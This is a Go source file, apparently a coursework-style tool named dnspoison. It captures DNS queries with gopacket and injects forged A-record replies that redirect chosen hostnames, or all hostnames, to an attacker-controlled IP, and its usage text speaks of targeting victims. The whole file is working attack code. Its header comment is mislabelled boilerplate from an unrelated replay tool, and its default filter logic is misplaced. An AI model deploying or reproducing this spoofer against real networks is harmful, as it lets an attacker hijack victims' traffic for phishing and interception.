// Copyright 2012 Google, Inc. All rights reserved.
//
// Use of this source code is governed by a BSD-style license
// that can be found in the LICENSE file in the root of the source
// tree.

// The pcaplay binary load an offline capture (pcap file) and replay
// it on the select interface, with an emphasis on packet timing
package main

import (
	"flag"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"io/ioutil"
	"net"
	"os"
	"strings"
)

// go run dnspoison.go [-i interface] [-f hostnames] [expression]
func main() {
	// Parsing command lines
	var ifaceName string
	var hostFile string
	var bpfFilterArr []string
	flag.StringVar(&ifaceName, "i", "", "Live capture from the network device <interface> (e.g., eth0). If not specified, mydump should automatically select a default interface to listen on.")
	flag.StringVar(&hostFile, "f", "", "Read a list of IP address and hostname pairs specifying the hostnames to be hijacked. If '-f' is not specified, dnspoison would forge replies to all observed requests with the chosen interface's IP address as an answer")
	flag.Usage = func() {
		_, _ = fmt.Fprintf(flag.CommandLine.Output(), "Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
		fmt.Println("<expression> is a BPF filter that specifies a subset of the traffic to be monitored, which is useful for targeting a single victim or a group of victims")
	}
	flag.Parse()
	bpfFilterArr = flag.Args()
	if ifaceName == "" { // interface is not specified, set as default device interface
		ifs, _ := pcap.FindAllDevs()
		ifaceName = ifs[0].Name
	}
	// fmt.Println("Arguments:", ifaceName, hostFile, strings.Join(bpfFilterArr, " "))

	// opens a device and returns a handle
	handle, err := pcap.OpenLive(ifaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	} else if flag.NArg() != 0 { // set BPFFilter if specified
		if err := handle.SetBPFFilter(strings.Join(bpfFilterArr, " ")); err != nil {
			panic(err)
		} else { // assign default BPFFilter
			_ = handle.SetBPFFilter("udp port 53")
		}
	}
	defer handle.Close()

	ip := getIfaceAddr(ifaceName)    // get ip addr relates to the specified interface
	ipHosts := readMapping(hostFile) // read ip host mapping from file

	// Create a DecodingLayerParser for decoding
	var ethLayer layers.Ethernet
	var ipv4Layer layers.IPv4
	var udpLayer layers.UDP
	var dnsLayer layers.DNS
	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
	decodedLayers := make([]gopacket.LayerType, 0, 4)
	buf := gopacket.NewSerializeBuffer()
	serialOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// swap storage for ip and udp fields
	var ipv4Addr net.IP
	var udpPort layers.UDPPort
	var ethMac net.HardwareAddr

	var i uint16
	for {
		packetData, _, _ := handle.ReadPacketData()
		err = decoder.DecodeLayers(packetData, &decodedLayers)
		if len(decodedLayers) != 4 || dnsLayer.QR { // if QR = 1, means its a DNS response packet
			continue
		}

		fmt.Println("========== Packet captured! ==========")
		fmt.Printf("DNS questions: total %v\n", dnsLayer.QDCount)
		for i = 0; i < dnsLayer.QDCount; i++ {
			fmt.Printf("[%v]: %v", i, string(dnsLayer.Questions[i].Name))
		}

		dnsLayer.QR = true // QR: true indicates a response packet
		if dnsLayer.RD {   // RD(Recursion Desired): is set in a query and is copied into the response.
			dnsLayer.RA = true // RA(Recursion Available): indicates recursive query is available in the name server.
		}

		forge := false
		var q layers.DNSQuestion
		for i = 0; i < dnsLayer.QDCount; i++ { // iterate through questions
			q = dnsLayer.Questions[i]
			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
				continue
			}

			var a layers.DNSResourceRecord
			a.Type = layers.DNSTypeA
			a.Class = layers.DNSClassIN
			a.TTL = 300
			a.Name = q.Name
			// assign related ip addr
			if ipHosts == nil { // mapping file is not specified, use ip addr of interface
				forge = true
				a.IP = ip
			} else if ipStr, ok := ipHosts[string(q.Name)]; ok { // use ip addr in mapping file
				forge = true
				a.IP = net.ParseIP(ipStr)
			} else { // ip addr is not provided in mapping file, ignore
				continue
			}
			fmt.Printf("forged: type %v, [%v] -> [%v]", a.Type, string(q.Name), a.IP)
			dnsLayer.Answers = append(dnsLayer.Answers, a)
			dnsLayer.ANCount = dnsLayer.ANCount + 1
			fmt.Printf("DNS answer total: %v\n", dnsLayer.ANCount)
		}

		if forge == false {
			fmt.Println("no need to forge response")
			continue
		}

		// swap src/dst mac
		ethMac = ethLayer.SrcMAC
		ethLayer.SrcMAC = ethLayer.DstMAC
		ethLayer.DstMAC = ethMac
		// swap src/dst ip
		ipv4Addr = ipv4Layer.SrcIP
		ipv4Layer.SrcIP = ipv4Layer.DstIP
		ipv4Layer.DstIP = ipv4Addr
		fmt.Printf("IP: src %v, dst %v\n", ipv4Layer.SrcIP, ipv4Layer.DstIP)
		// swap src/dst udp ports
		udpPort = udpLayer.SrcPort
		udpLayer.SrcPort = udpLayer.DstPort
		udpLayer.DstPort = udpPort
		fmt.Printf("UDP port: src %v, dst %v\n", udpLayer.SrcPort, udpLayer.DstPort)

		// serialize packets
		_ = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
		_ = gopacket.SerializeLayers(buf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)

		// write packet
		err = handle.WritePacketData(buf.Bytes())
		if err != nil {
			panic(err)
		}

		fmt.Println("Response sent")

		continue
	}

}

func getIfaceAddr(ifaceName string) net.IP {
	ifaces, _ := net.Interfaces()
	for i := range ifaces {
		if ifaces[i].Name == ifaceName {
			addrs, err := ifaces[i].Addrs()
			if err != nil {
				panic(err)
			}

			if len(addrs) == 0 {
				panic("No addr relates to specified interface")
			}

			for _, addr := range addrs {
				ip, _, _ := net.ParseCIDR(addr.String())
				if ip.To4() != nil {
					fmt.Println("ip to interface", ifaceName, ip)
					return ip
				}
			}
		}
	}
	return nil
}

func readMapping(filename string) map[string]string {
	if filename == "" {
		return nil // return an empty map if filename not specified
	}

	ipHost := make(map[string]string)
	data, _ := ioutil.ReadFile(filename)
	lines := strings.Split(string(data), "\n")
	for _, element := range lines {
		line := strings.Fields(element)
		if len(line) == 0 {
			break
		}
		ipHost[line[1]] = line[0]
	}
	fmt.Println(ipHost)
	return ipHost
}
